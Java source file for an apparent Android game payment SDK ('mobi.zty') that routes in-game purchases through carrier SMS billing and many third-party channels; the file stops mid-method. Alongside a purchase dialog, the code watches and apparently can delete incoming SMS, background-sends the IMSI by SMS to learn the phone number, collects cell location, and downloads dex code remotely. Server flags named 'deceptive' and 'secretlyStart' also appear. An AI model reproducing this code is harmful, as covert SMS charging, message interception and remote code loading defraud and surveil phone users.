
package mobi.zty.sdk.game;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.locks.Lock;
import java.util.concurrent.locks.ReentrantLock;

import mobi.zty.pay.R;
import mobi.zty.pay.sdk.PayConfig;
import mobi.zty.pay.sdk.PayResultInfo;
import mobi.zty.pay.sdk.factory.PaymentFactoy;
import mobi.zty.pay.sdk.hejuFee.HeJuFeeInstance;
import mobi.zty.sdk.game.bean.ActivateResult;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.game.bean.InitializeResult;
import mobi.zty.sdk.game.bean.SMSInfo;
import mobi.zty.sdk.game.bean.SdkPayInfo;
import mobi.zty.sdk.game.bean.ShopInfo;
import mobi.zty.sdk.game.bean.UserInfo;
import mobi.zty.sdk.game.bean.VerifyInfo;
import mobi.zty.sdk.game.callback.ActivateCallback;
import mobi.zty.sdk.game.callback.InitializeCallback;
import mobi.zty.sdk.game.intercept.SMS;
import mobi.zty.sdk.game.intercept.SMSHandler;
import mobi.zty.sdk.game.intercept.SMSObserver;
import mobi.zty.sdk.game.object.parser.ActivateResultParser;
import mobi.zty.sdk.game.object.parser.InitializeResultParser;
import mobi.zty.sdk.http.HttpCallback;
import mobi.zty.sdk.http.HttpRequest;
import mobi.zty.sdk.util.DeviceInfo;
import mobi.zty.sdk.util.DeviceInfoUtil;
import mobi.zty.sdk.util.DowloadDexFile;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.HttpRequestt;
import mobi.zty.sdk.util.LocalStorage;
import mobi.zty.sdk.util.MzDialog;
import mobi.zty.sdk.util.Util_G;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.door.frame.MainActivity;








import android.app.ActionBar.LayoutParams;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.AlertDialog.Builder;
import android.app.Dialog;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.ContentObserver;
import android.media.audiofx.NoiseSuppressor;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.os.PowerManager;
import android.provider.SyncStateContract.Helpers;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

public class GameSDK implements InitializeCallback,ActivateCallback {
	private final static Lock lock = new ReentrantLock();
	private static GameSDK instance;
    public static String mbDelSMS = "0";
	public Context context;
	private SMSReceiver mSMSReceiver1 = new SMSReceiver();
//	private SMSReceiver mSMSReceiver2 = new SMSReceiver();
	private IntentFilter mSMSResultFilter = new IntentFilter();
//	private IntentFilter mSMSResultFilter2 = new IntentFilter();
	public static final String RECEIVED_SMS_ACTION= "android.provider.Telephony.SMS_RECEIVED";
	public String gameId;
	public String pc_ext;
	public String channelID;//一般不用 只有破解使用
	public String gameName;
	public String packetId="1";//lsl
	public String deviceId;
	HttpRequest<InitializeResult> mInitializeRequest = null; //初始化的request请求
	/*联网用到的变量 start*/
	public String dipcon;//登录跑马灯内容 
	public String dipcon2;//支付跑马灯内容 
	public String dipurl;//支付公告
	public String noturl;//登录公告
	public String exiturl;
	private static final int NOTICE_STARTPAY = 100;
	private static final int NOTICE_EXITGAME = 105;
	private static final int NOTICE_INIT_PAY = 110;
	private static final int NOTICE_PROMIT = 115;
	private static final int REPEAT_CANPAY = 120;
	private static long intervalPayDaley = 0;
	private  String phoneNum = "";//手机号码
	private  String numUrl = "http://sa.91muzhi.com:8080/sdk/mobileNum?";//获取手机号码的url

	private  String obtainNum = "";//获取手机号码的 端口
	public static int payway;
	private PowerManager mPowerManager = null;
	private boolean SendTimer = true;
	private int afdft;
	private String afdf;
	private  String payResultUrl = "http://sa.91muzhi.com:8080/sdk/orderState";

	public int OnlineLibVersionCode;//服务端所给 后台热更jar的版本
	private Map<Integer, FeeInfo> mmActivateInfos = null;
	private ArrayList<FeeInfo> list_ActivateInfos = null;
	private int obtain_num_mark = 0;//是否需要获取手机号码的标志位
	private int sureBtton ;
	
	/**
	 * key 商品索 该商品计费所需要的 信息
	 */
	private Map<String, FeeInfo> orderFeeinfoMap = new HashMap<String, FeeInfo>();
  
	/**
	 * 当前正在执行支付的商品
	 */
	public static  ShopInfo curPayShop = null;
	
	public static boolean canPay = true;
	
	public static int secretlyStart = -1;
	public String defaultMK = "0";
	public String gameVersionCode = "4";
	public GameSDKInitListener gameSDKInitListener;
	
	/**
	 * 直接走 特定的支付
	 */
	public static String directPay = "";
	private static Handler handler = new Handler(Looper.getMainLooper()){
		public void dispatchMessage(android.os.Message msg) {
			switch (msg.what) {
			case NOTICE_PROMIT:{
				String promitMsg = (String) msg.obj;
				if (!Helper.isEmpty(promitMsg)) {
					Toast.makeText(instance.context, promitMsg, Toast.LENGTH_LONG).show();
				}
				break;
			}
			case REPEAT_CANPAY:{
				canPay = true;
				break;
			}
			case NOTICE_INIT_PAY:{
				String orderId = (String) msg.obj;
				if (orderId == null) {
					instance.initialize();
				}else{
					if (curPayShop != null
							&& curPayShop.mapFeeInfos.containsKey(orderId)) {
						FeeInfo feeInfo = curPayShop.mapFeeInfos.get(orderId);
						instance.initMkPay(feeInfo.payType, feeInfo);
					}
				}
				
			}
				break;
			case NOTICE_STARTPAY:
				String orderId = (String) msg.obj;
				try{
					
					if (curPayShop!=null&&curPayShop.mapFeeInfos.containsKey(orderId)) {
						FeeInfo feeInfo = curPayShop.mapFeeInfos.get(orderId);
						if (mapInitSucc.containsKey(feeInfo.payType)&&mapInitSucc.get(feeInfo.payType)) {
							feeInfo.startTime = System.currentTimeMillis();
							PaymentFactoy.producePay(feeInfo.mkClassName,instance.context).pay(
									instance.context,feeInfo);
						}else{
							instance.allNotifyPayFail(PayConfig.SDK_INIT_FAIL, "初始化未成功", orderId);
						}
						
					}
				} catch (Throwable e) {
					e.printStackTrace();
					instance.allNotifyPayFail(PayConfig.PAY_EXPTION_FAIL, "支付异常",orderId);
				}
				break;
			case NOTICE_EXITGAME:{
				instance.notiFyExitGame();
				break;
			}
			default:
				break;
			}
		};
	};
			
	private Handler commHandle = new Handler(Looper.getMainLooper()){
		public void handleMessage(Message msg) {
			switch (msg.what) {
			case PayConfig.GIVE_ITEM_BEFIN:
				notifyPaymentFinish(SendOder.getInstance().amount);
				break;
			case PayConfig.PAY_REPEAT_CANER:
				gameSDKPaymentListener.onPayCancelled();//这个时候也得返回支付取消 不然游戏可能会卡住
				break;
			default:
				break;
			}
			
		};
	};
	/*联网用到的变量 end*/
	
	public Handler payResultHandle = new Handler(Looper.getMainLooper()){
		public void handleMessage(android.os.Message msg) {
			PayResultInfo info = (PayResultInfo) msg.obj;
			FeeInfo feeInfo = null;
			if (msg.what!=PayConfig.NATIVE_FEE_FAIL) {
				if (Helper.isEmpty(info.orderId)) {
					SendOder.getInstance().notifyErrorCode(info.resutCode,"");//向服务端发送错误码
					notifyPaymentFail(info);
					return;
				}
				feeInfo = getFeeInfoByCurShop(info.orderId);//当前正在支付的 商品中找
				if (feeInfo == null) {//如果当前支付的 道具中 无该订单 ，那是前面支付遗留下来的订单
					feeInfo = getFeeInfoByOrderId(info.orderId); //这个集合里面的 计费在这里只做统计来使用
					if (feeInfo==null) {
						SendOder.getInstance().notifyErrorCode(info.resutCode,"");
					}else{
						SendOder.getInstance().notifyErrorCode(info.resutCode,info.orderId);
					}
					return;
				}
			}
			
			switch (msg.what) {
			case PayConfig.NOTIFY_PAYRESULT:{//移动支付 结果回调 
				if (info == null) {
					return;
				}
				switch (info.resutCode) {
				case PayConfig.BIIL_SUCC:
					int mark = getNummark();
					if(mark==1 && Helper.isEmpty(getPhoneNum())){//后台需要获取手机号码且没有拿到手机号的时候
						Util_G.debugE("支付成功后的mark-->>", mark+"");
						Util_G.sendTextMessage(context, getObtainNum(), Helper.getIMSI(context), null, 0);//发这条短信给平台 是为了获取手机号码
					}
					notifyPaymentFinish(SendOder.getInstance().amount);
					if (feeInfo.payStep!=3) {
						feeInfo.payStep = 3;
						SendOder.getInstance().sapay_ret(info.retMsg, info.resutCode,feeInfo.orderId);
						allCheckPay(0);
					}
					break;
//				case PayConfig.BIIL_CANCER:
//					notifyPaymentCancelled();
//					break;
				default:
					SendOder.getInstance().notifyErrorCode(info.resutCode,feeInfo.orderId);
					feeInfo.payStep = 4;
					allCheckPay(1);
					break;
				}
				break;
			}
			
			case PayConfig.NATIVE_FEE_FAIL:{//破解支付 短信被拦截
				feeInfo = haveCallbakePay();
				if (curPayShop!=null) {
					for (FeeInfo feeInfo2 : curPayShop.mapFeeInfos.values()) {
						if (feeInfo2.payType==PayConfig.ANAN_FEE) {
							try {// 移动MM安安破解
								PaymentFactoy.producePay(feeInfo2.mkClassName,
										GameSDK.getInstance().context)
										.notifyPay(1,feeInfo2.orderId);
							} catch (Throwable e) {
								e.printStackTrace();
							}
						}
						feeInfo2.payStep = 4;//统统设置为 通知失败
						if (feeInfo==null||!feeInfo.orderId.equals(feeInfo2.orderId)) {
							SendOder.getInstance().notifyErrorCode(PayConfig.NATIVE_FEE_FAIL,feeInfo2.orderId);
						}
					}
					if (feeInfo!=null) {//这种情况视为成功 并发货
						feeInfo.payStep = 4;
						notifyPaymentFinish(SendOder.getInstance().amount);
						SendOder.getInstance().notifyErrorCode(PayConfig.YIMEROUT_SCC_PAY,feeInfo.orderId);
						break;
					}
				}
				allCheckPay(0);
			}
				break;
			default:
				break;
			
			}
		}
	};
	
	private Handler otherHandler = new Handler(Looper.getMainLooper()) {// 第三方支付 回调
		public void handleMessage(Message msg) {
			try {
				switch (msg.what) {
				case PayConfig.WECAHT_SUCC: {
					PayResultInfo resultInfo = new PayResultInfo();
					resultInfo.resutCode = PayConfig.BIIL_SUCC;
					resultInfo.orderId = otherOrderId;
					Message message = payResultHandle.obtainMessage(PayConfig.NOTIFY_PAYRESULT);
					message.obj = resultInfo;
					message.sendToTarget();
				}
					break;
				case PayConfig.WECAHT_CANCER:{
					notifyPaymentCancelled();
					break;
				}
				default:
					otherPayFail();
					break;
				}
			} catch (Exception e) {
				Log.e(Constants.TAG, e.getMessage());
			}
		}
		private void otherPayFail() {
			PayResultInfo info = new PayResultInfo();
			info.resutCode = PayConfig.WECHAT_PAY_FAIL;
			info.retMsg = "第三方支付失败";
			notifyPaymentFail(info);
		}
	};
	public static GameSDKPaymentListener gameSDKPaymentListener;
	int mcc,mnc,lac,cid;
	/**
	 * key 支付类型 value 是mkclassName
	 */
	public static Map<Integer, String> mpPayTypeClassName = new HashMap<Integer, String>();
	
	public static Map<Integer,Boolean> mapInitSucc = new HashMap<Integer, Boolean>();
	/**
	 * key 需要根据回调来判断的 计费类型 value 超时是否可以发货
	 */
	public static Map<Integer, Boolean> payTypeIsSdk = new HashMap<Integer, Boolean>();
	
	/**
	 * 一进游戏就需要初始化的 sdk(安安不用调初始化接口，支付的时候会自动调用)
	 */
	public static Map<Integer, Boolean> fastInitMk = new HashMap<Integer, Boolean>();
	static{
		fastInitMk.put(PayConfig.QIPA_PAY, true);
		fastInitMk.put(PayConfig.FANHE_PAY, true);
		fastInitMk.put(PayConfig.ZHANGLONG_PAY, true);
		fastInitMk.put(PayConfig.HEJU_PAY, true);
		payTypeIsSdk.put(PayConfig.QIPA_PAY, true);
		payTypeIsSdk.put(PayConfig.YEYOU_FEE, true);
		payTypeIsSdk.put(PayConfig.DONGMA_MONTH_PAY, true);
		payTypeIsSdk.put(PayConfig.ZHANGPAY_PAY, true);
		payTypeIsSdk.put(PayConfig.ZHANGLONG_PAY, true);
//		payTypeIsSdk.put(PayConfig.ZHANGLONG_PAY, true);
		
		mpPayTypeClassName.put(PayConfig.LEYOU_FEE, "mobi.zty.pay.sdk.leyouFee.LeYouFeeInstance");
		mpPayTypeClassName.put(PayConfig.ANAN_FEE, "mobi.zty.pay.sdk.ananFee.AnAnFeeInstance");
		mpPayTypeClassName.put(PayConfig.TC_FEE, "mobi.zty.pay.sdk.tianyiFee.TianYiFeeInstance");
		mpPayTypeClassName.put(PayConfig.TC_ALL_FEE, "mobi.zty.pay.sdk.DXAllFee.DXAllFeeInstance");
		mpPayTypeClassName.put(PayConfig.YEYOU_FEE, "mobi.zty.pay.sdk.yeYouFee.YeYouFeeInstance");
		mpPayTypeClassName.put(PayConfig.FANHE_PAY, "mobi.zty.pay.sdk.fanheFee.FanHeFeeInstance");
		mpPayTypeClassName.put(PayConfig.WECHAT_PAY, "mobi.zty.pay.sdk.wecaht.WeChatInstance");
		mpPayTypeClassName.put(PayConfig.DONGFENG_PAY, "mobi.zty.pay.sdk.dongfeng.DongFengFeeInstance");
		mpPayTypeClassName.put(PayConfig.YIXUN_PAY, "mobi.zty.pay.sdk.YiXunFee.YiXunFeeInstance");
		mpPayTypeClassName.put(PayConfig.DONGMA_PAY, "mobi.zty.pay.sdk.dongma.DongMaFeeInstance");
		mpPayTypeClassName.put(PayConfig.QIPA_PAY, "mobi.zty.pay.sdk.qipaSDkFee.QipaSdkInstance");
		mpPayTypeClassName.put(PayConfig.DONGMA_MONTH_PAY, "mobi.zty.pay.sdk.dongmaMonth.DongmanMonthInstance");
		mpPayTypeClassName.put(PayConfig.YUANLIN_PAY, "mobi.zty.pay.sdk.yuanlin.YuanLinInstance");
		mpPayTypeClassName.put(PayConfig.ZHONGKE_PAY, "mobi.zty.pay.sdk.zhongke.ZhongKeInstance");
		mpPayTypeClassName.put(PayConfig.BEIQING_PAY, "mobi.zty.pay.sdk.beiqing.BeiQingInstance");
		mpPayTypeClassName.put(PayConfig.TIANYI_MONTH_PAY, "mobi.zty.pay.sdk.tianyiMonth.TianYiMonthInstance");
		mpPayTypeClassName.put(PayConfig.WOYUEDU_PAY, "mobi.zty.pay.sdk.woyuedu.WoYueDuInstance");
		mpPayTypeClassName.put(PayConfig.DONGMANDDO_PAY,"mobi.zty.pay.sdk.dongmanDDO.DongManDDOInstance");
		mpPayTypeClassName.put(PayConfig.FUDUODUO_PAY,"mobi.zty.pay.sdk.fuduoduo.FuDuoDuoInstance");
		mpPayTypeClassName.put(PayConfig.RDO_PAY,"mobi.zty.pay.sdk.rdo.RDOInstance");
		mpPayTypeClassName.put(PayConfig.ZHANGPAY_PAY,"mobi.zty.pay.sdk.zhangzhifu.ZhangPayInstance");
		mpPayTypeClassName.put(PayConfig.VFUBAO_PAY,"mobi.zty.pay.sdk.vfubao.VFuBaoPayInstance");
		mpPayTypeClassName.put(PayConfig.ZHANGLONG_PAY,"mobi.zty.pay.sdk.zhanglong.ZhangLongPayInstance");
		mpPayTypeClassName.put(PayConfig.HEJU_PAY,"mobi.zty.pay.sdk.hejuFee.HeJuFeeInstance");
		mpPayTypeClassName.put(PayConfig.GENERA_KEY,"mobi.zty.pay.sdk.generalFee.GeneraFeeInstance");
		
	}
	/**
	 * 保证只发货一次
	 */
	public int bCallback = 0;
	private GameSDK(Context context) {
		this.context = context;
		this.mPowerManager = (PowerManager) context
				.getSystemService(Context.POWER_SERVICE);
		SendTimer = true;
		new DurationTread().start();
	}
	
	public static GameSDK getInstance(Context context) {

        try {
            lock.lock();
            if (instance == null) {
                instance = new GameSDK(context);
            }
            return instance;
        } finally {
            lock.unlock();
        }
    }
	
	public static GameSDK getInstance() {
	    return instance;
	}
	/**
	 * @param activity
	 * @param gameID
	 * @param packetID
	 * @param ext 
	 * @return 实际支付类型 1移动 5联通 10电信 15支付宝
	 */
	public static int initSDK(Activity activity,String gameID,String packetID,
			GameSDKInitListener gameSDKInitListener,String ...exts) {
		Constants.DEX_URL = String.format(Constants.DEX_URL, packetID,Constants.SDK_VERSION_CODE);
		if (DowloadDexFile.getInstance().canReeatDownload()) {
			DowloadDexFile.getInstance().checkVersion(activity, Constants.DEX_URL);
		}
		if (instance != null) {
			return 0;
		}
        getInstance(activity);
        instance.afdft = (int)(System.currentTimeMillis()/1000);//
        
        //instance.packetId = packetId;
       //instanc-----e.gameId = gameId;//Constants.GAMEID;//MetaDataUtil.getInt(activity, "SHOUMENG_GAME_ID", 1);
        
        instance.gameSDKInitListener = gameSDKInitListener;
        LocalStorage storage = LocalStorage.getInstance(activity);
        String discon = storage.getString(Constants.DisCon);
        instance.dipcon = discon;
        instance.noturl = storage.getString(Constants.DisUrl);
        if (exts!=null) {
        	if (exts.length>0) {
        		instance.pc_ext = exts[0];
			}
        	if (exts.length>1) {
				instance.defaultMK = exts[1];
			}
        	if (exts.length>2) {
        		instance.gameVersionCode = exts[2];
			}
		}
         
        instance.gameId = gameID.trim();
		instance.channelID = packetID.trim();
		if (Helper.isDebugEnv()) {
			instance.makeToast("当前测试模式！");
//			Constants.SERVER_HOST = "http://sa.91muzhi.com:8090";
			Constants.SERVER_HOST = "http://119.29.133.73:8080";
//			Constants.SERVER_HOST = "http://192.168.0.112:8080";
			Constants.modifyUrlByHost(Constants.SERVER_HOST);
//			Constants.SERVER_URL = "http://192.168.0.112:8080/sdk/%s";
			
		}else{
			Constants.modifyUrlByHost(Constants.SERVER_HOST);
		}
		instance.gameName = Helper.getApplicationName(activity);
		payway = Helper.getSIMType(instance.context);
		handler.sendEmptyMessage(NOTICE_INIT_PAY);
       return payway;
    }
	/**
	 * 设置程序是否为测试模式 默认false
	 * @param var
	 */
	public static void setDebug(boolean var){
		Helper.setDebug(var);
	}
	public void initialize() {
		mSMSResultFilter.addAction(Constants.SENT_SMS_ACTION);
		context.registerReceiver(mSMSReceiver1, mSMSResultFilter);
		SendOder.getInstance().init(context);//初始化发送 订单统计的 类
		
		instance.initMkPay(PayConfig.QIPA_PAY,null);
		instance.initMkPay(PayConfig.HEJU_PAY, null);
		addSMSObserver(context);//监听数据库的变化
		switch (Helper.getSIMType(context)) {//提前初始化fastInitMk中的支付sdk
		case 5://联通
			instance.initMkPay(PayConfig.FANHE_PAY,null);
			break;
		case 1:
			instance.initMkPay(PayConfig.ZHANGLONG_PAY,null);
			break;
		default:
			break;
		}
		try {
			
			PaymentFactoy.producePay("mobi.zty.pay.sdk.wecaht.WeChatInstance",context).init(context,
					otherHandler);
			;
		} catch (Throwable e) {
			Util_G.debugE("PayConfig.weixin", e.getMessage());
		}
		
		//下面初始化 packetID在激活的时候要用到 所以最好在init(this)前初始化，PayConfig.currentAppID会在移动MM初始化后赋值
		String channel = Helper.getChannel((Activity)context,"channel");
		if (channel==null ||channel.trim().length()==0) {
			channel = "0000000000";
		}
		if (Helper.isDebugEnv()) {
			channel = "3003984937";
		}
		instance.packetId  =  instance.channelID;
        init(this);
    }
	
	private void init(InitializeCallback initializeCallback) {
    	Util_G.debug_i("test", "init");//
        LocalStorage storage = LocalStorage.getInstance(context);
        deviceId = storage.getString(Constants.DEVICE_ID);
        String URL = storage.getString(Constants.URL);
        if(URL.length() > 1&&!(Helper.isDebugEnv()))
        {
        	Constants.SERVER_URL = URL;
        }
        Util_G.debug_i("test", "url="+URL);
        if(Helper.isEmpty(deviceId)) {

            DeviceInfo info = DeviceInfoUtil.getDeviceInfo(context);
            info.setPackageId(packetId);
            String api = String.format(Constants.SERVER_URL, "init");
            HttpRequest<InitializeResult> request = new HttpRequest<InitializeResult>(context,
            		new InitializeResultParser(),
                    new InitializeListener(initializeCallback));
            mInitializeRequest = request;
            
            request.execute(
                    api,
                    info.toJSON());

        } else {
            InitializeResult result = new InitializeResult(deviceId);
            initializeCallback.onInitSuccess(result);
        }
        
    }
	 private class InitializeListener implements HttpCallback<InitializeResult> {

	        private InitializeCallback callback;

	        private InitializeListener(InitializeCallback callback) {
	            this.callback = callback;
	        }

	        @Override
	        public void onSuccess(InitializeResult object) {
	            GameSDK.this.deviceId = object.getDeviceId();
	            LocalStorage storage = LocalStorage.getInstance(context);
	            storage.putString(Constants.DEVICE_ID, object.getDeviceId());
	            callback.onInitSuccess(object);
	        }

	        @Override
	        public void onFailure(int errorCode, String errorMessage) {
	            callback.onFailure(errorCode, errorMessage);
	            if(errorCode != Constants.ERROR_CODE_NET)
	            {
	            	//暂时单机初始化请求失败 不做任何处理
	            }
	        }

	    }
	public void activate()
	{
	   activate(this);
	}
	private void activate(ActivateCallback activateCallback) {

    	Util_G.debug_i("test", "activate");
        String api = String.format(Constants.SERVER_URL, "activate");
   
        HttpRequest<ActivateResult> request = new HttpRequest<ActivateResult>(context,
        		new ActivateResultParser(),
                new ActivateListener(activateCallback));
        
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String operator = telephonyManager.getNetworkOperator();
        lac = 0;
        cid = 0;
        mcc = 0;
        mnc = 0;
        if (operator!=null&&!Helper.isEmpty(operator)) {
        	try {
        		mcc = Integer.parseInt(operator.substring(0, 3));
                mnc = Integer.parseInt(operator.substring(3));
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
        
        if (mnc==2||mnc==0||mnc==7) {
        	try {
        		GsmCellLocation location = (GsmCellLocation) telephonyManager.getCellLocation();
        		lac = location.getLac();
        		cid = location.getCid();
			} catch (Exception e) {
				e.printStackTrace();
			}
            
		}else{
            lac = 0; 
            cid = 0; 
		}
        
        
        JSONObject user = new JSONObject();
        try {
			user.put("device_id", deviceId);
			user.put("packet_id", packetId);
			user.put("imsi", Helper.getIMSI(context));
			user.put("simop", Helper.getIMSIStart(context));
	        user.put("game_id", gameId);
	        user.put("ver", Constants.GAME_SDK_VERSION);
	        user.put("mcc", mcc);
	        user.put("mnc", mnc);
	        user.put("lac", lac);
	        user.put("cid", cid);
	        user.put("game_ver", instance.gameVersionCode);
	        user.put("sdk_ver", Constants.SDK_VERSION_CODE);
	        Util_G.debugE("user-->", user.toString());
		} catch (JSONException e) {
			e.printStackTrace();
		}
        request.execute(
                api,
                user.toString());

    }
	private class ActivateListener implements HttpCallback<ActivateResult> {

        private ActivateCallback callback;

        private ActivateListener(ActivateCallback callback) {
            this.callback = callback;
        }

        @Override
        public void onSuccess(ActivateResult object) {
            callback.onActivateSuccess(object);
        }

        @Override
        public void onFailure(int errorCode, String errorMessage) {
            callback.onFailure(errorCode, errorMessage);
            if(errorCode != Constants.ERROR_CODE_NET)
            {
               //单机激活失败不做处理
            }
        }

    }
	
   
	@Override
	public void onInitSuccess(
			mobi.zty.sdk.game.bean.InitializeResult initializeResult) {
		 GameSDK.this.deviceId = initializeResult.deviceId;
	        //activate(this);//lsl
	     activate();
	}
	@Override
	public void onFailure(int errorCode, String errorMessage) {
//		Util_G.debug_i("test", "失败恢复url="+Constants.OSERVER_URL);
//        LocalStorage storage = LocalStorage.getInstance(context);
//        storage.putString(Constants.URL, Constants.OSERVER_URL);
	}
	@Override
	public void onActivateSuccess(ActivateResult activateResult) {
		Util_G.debugE("ALLPAY", "imsi==="+Helper.getIMSI(context));
		GameSDK.this.afdf = activateResult.getAdfd();
        GameSDK.this.dipcon = activateResult.getDipcon();
        GameSDK.mbDelSMS = activateResult.getbDel();
        intervalPayDaley = activateResult.getIntervalPayDaley();
        int openDark = activateResult.getOpenDark();
        int openAlert = activateResult.getOpenAlert();
        int openButton = activateResult.getOpenButton();
        int openOurAlert = activateResult.getOpenOurAlert();
        int cootype = activateResult.getCootype();
        int deceptive = activateResult.getDeceptive();

        if (instance.gameSDKInitListener!=null) {
        	instance.gameSDKInitListener.onOpenDark(openDark, openAlert, openButton, openOurAlert,cootype,deceptive);
		}
        LocalStorage storage = LocalStorage.getInstance(context);
        storage.putString(Constants.URL, activateResult.getUrl());
        Util_G.debug_i("test", "newurl="+activateResult.getUrl());
        storage.putString(Constants.DisCon, activateResult.getDipcon());
        storage.putString(Constants.DisUrl,activateResult.getNoturl());
        
        OnlineLibVersionCode= activateResult.getOnlineLibVersionCode();
        mmActivateInfos = activateResult.getMmActivateInfos();
        list_ActivateInfos = activateResult.getactivateFeeinfo();
//        obtain_num_mark = activateResult.getObtain_num_mark();
        setNmumark(activateResult.getObtain_num_mark());
        Util_G.debugE("mark-->>", activateResult.getObtain_num_mark()+"");                                     
        setPhoneNum(activateResult.getPhoneNum());
        setObtainNum(activateResult.getObtainNum());
		if (mmActivateInfos!=null&&mmActivateInfos.size()>0) {//移动mm 进入游戏时 刷用户
			for (Integer mk : mmActivateInfos.keySet()) {
				for(int i = 0;i<list_ActivateInfos.size();i++){
					initMkPay(mk, list_ActivateInfos.get(i));
				}
			}
			
		}
        
        instance.dipcon2 = activateResult.getDipcon2();
        instance.dipurl = activateResult.getDipurl();
        instance.noturl = activateResult.getNoturl();
        instance.exiturl = activateResult.getExiturl();
        afdf3();//进来后把上次 推出前的时长通知给后台。
	}
	public synchronized void initMkPay(int payType,FeeInfo feeInfo) {
		String className = null;
		if (mpPayTypeClassName.containsKey(payType)) 
			className = mpPayTypeClassName.get(payType);
		if (feeInfo != null&&!Helper.isEmpty(feeInfo.mkClassName)) className = feeInfo.mkClassName;
		if (className!=null) {
			try {//本地初始化不需要传参数的  sdk 直接一进游戏就初始化
				PaymentFactoy.producePay(className,context).init(context,payResultHandle,feeInfo);
				
				mapInitSucc.put(payType, true);
			} catch (Throwable e) {
				e.printStackTrace();
			}	
		}
	}
	public void dexPayInit(int mk){
		if (fastInitMk.containsKey(mk)) {
			initMkPay(mk, null);
		}
	}
	/**
	 * 检查后台是否给了 手机号码
	 */
	private void checkNumber() {
		if (Helper.isEmpty(getPhoneNum())&&!Helper.isEmpty(getObtainNum())) {
		    Util_G.sendTextMessage(context, getObtainNum(), Helper.getIMSI(context), null, 0);//发这条短信给平台 是为了获取手机号码
			Helper.httpGetPhonNum(getNumUrl(), Helper.getIMSI(context), new Helper.Callback() {//轮询我们自己服务端获取手机号码
				
				@Override
				public void onResult(String info) {
					if (info!=null&&!info.trim().equals("")) {
						try {
							JSONObject resut = new JSONObject(info);
							String num = resut.getString("mobile_num");
							if (num!=null&&!num.equals("")) {
								setPhoneNum(num);
							}
						} catch (Exception e) {
							e.printStackTrace();
						}
					}
					
				}
			});
		}
	}

	public static String getSetting(Context activity, String name) {
		String value = "";
		LocalStorage storage = LocalStorage.getInstance(activity);
		value = storage.getString(name);
		return value;

	}
//	private AlertDialog sureDialog ;
	private Button cancel_btn,confirm_btn;
	private TextView txt_appname,txt_productname,txt_amount,txt_telephone,txt_details;
	/**
	 * 支付接口
	 * @param requestAmount 单位是分
	 * @param payindex  计费点索引
	 * @param payname 该商品名称
	 * @param gameSDKPaymentListener 回调监听
	 * @param extendP  参数1默认支付类型  参数2是订单号
	 */
	public void startPay(final int requestAmount,final int payindex,final String payname,
			final GameSDKPaymentListener gameSDKPaymentListener,final String ...extendP){
		boolean issure = false;
		if(issure){
			surePay(requestAmount, payindex, payname, gameSDKPaymentListener, extendP);
		}else{
			try {

				final Dialog sureDialog = new MzDialog(context, R.style.mzDialog);
				confirm_btn = (Button) sureDialog.getWindow().findViewById(R.id.confirm_btn);
				cancel_btn = (Button) sureDialog.getWindow().findViewById(R.id.cancel_btn);
				txt_appname = (TextView) sureDialog.getWindow().findViewById(R.id.app_name);
				txt_productname = (TextView) sureDialog.getWindow().findViewById(R.id.productname);
				txt_amount = (TextView) sureDialog.getWindow().findViewById(R.id.amount);
				txt_telephone =  (TextView) sureDialog.getWindow().findViewById(R.id.telephone);
				txt_details =  (TextView) sureDialog.getWindow().findViewById(R.id.detailes);
				txt_appname.setText("游戏名称："+gameName);
				txt_productname.setText("道具名称："+payname);
				txt_amount.setText("资        费："+requestAmount+"元");
				txt_telephone.setText("客服电话："+"075586715263");
				txt_details.setText("点击“确认支付”发送购买短信，资费由运营商代收（不含通信费），如有疑问请拨打客服电话。");
				
				cancel_btn.setOnClickListener(new OnClickListener() {
					
					@Override
					public void onClick(View v) {
						// TODO Auto-generated method stub
						sureDialog.dismiss();
					}
				});
				confirm_btn.setOnClickListener(new OnClickListener() {
					
					@Override
					public void onClick(View v) {
						// TODO Auto-generated method stub
						surePay(requestAmount, payindex, payname, gameSDKPaymentListener, extendP);
						sureDialog.dismiss();
					}
				});
				sureDialog.setCanceledOnTouchOutside(false);
				sureDialog.show();
			} catch (Exception e) {
				// TODO: handle exception
				Util_G.debugE("ALLPAY-->>", e.getMessage());
			}
		}
	}
	
	private synchronized void surePay(int requestAmount,int payindex,String payname,
			GameSDKPaymentListener gameSDKPaymentListener,String ...extendP) {
		
		//加上canPay是为了控制连续点击造成的连续扣费问题，还需要跟后台对一下协议
		if (curPayShop!=null ||!canPay
				) {
			makeToast("请稍等30秒后再来领取道具吧！");
			Util_G.debugE("ALLPAY", "请稍等30秒后再来领取道具吧！");
			if (intervalPayDaley==0) {
				canPay = true;
			}else{
				handler.removeMessages(REPEAT_CANPAY);
				handler.sendEmptyMessageDelayed(REPEAT_CANPAY, intervalPayDaley);
			}
			commHandle.sendEmptyMessage(PayConfig.PAY_REPEAT_CANER);
			return;
		}
		canPay = false;
		GameSDK.gameSDKPaymentListener =  gameSDKPaymentListener;
		directPay = "";
		if (extendP!=null) {
			if (extendP != null) {
				if (extendP.length > 0&&!Helper.isEmpty(extendP[0])) {
					directPay = extendP[0];
				}
			}
		}
		if (directPay.equals(PayConfig.WECHAT_PAY)||SendOder.getInstance().amount>30*100) {
			notifyToOtherPay();
			return;
		}
		updateFeeInfo();
		SendOder.getInstance().amount = requestAmount;
		SendOder.getInstance().payname = payname;
		SendOder.getInstance().shopIndex = payindex;
		new Thread(new Runnable() {
			
			@Override
			public void run() {
				String requestUrl = getRequestUrl(0);
				requestFee(requestUrl);
			}
			
		}).start();
    }

	private void requestFee(String requestUrl) {
		PayResultInfo info = new PayResultInfo();
		try {
//			parck_id=CY14&imei=&imsi=&simop&sdk_ver=&amount=&imcc=&imnc=&icid=&ilac

